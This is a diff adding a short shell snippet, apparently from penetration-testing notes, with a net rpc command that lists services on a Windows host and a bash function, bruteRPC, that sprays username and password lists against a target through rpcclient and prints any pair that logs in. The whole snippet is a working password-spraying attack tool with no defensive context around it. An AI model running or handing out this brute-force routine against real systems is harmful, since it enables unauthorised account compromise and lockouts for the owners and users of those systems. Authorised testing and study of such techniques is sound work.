@@ -1,0 +1,17 @@
+# Requires authentication to get services (From linux -> target)
+net rpc service list -I <IPADDRESS> -U "<DOMAIN>\\<USERNAME>"
+
+# spray username%password in RPC
+bruteRPC() {
+ target=$1
+ echo -e "[*] Spraying user:pass combinations against RPC\n"
+ for uname in $(cat $2); do
+  for pword in $(cat $3); do
+   dotest=`rpcclient -U "$uname%$pword" -c "getusername;quit" $target | grep -i authority`
+   if [ "$dotest" != "" ]; then
+    echo -e "\t[!] Found combination: $uname%$pword"
+   fi
+  done
+ done
+ echo
+}
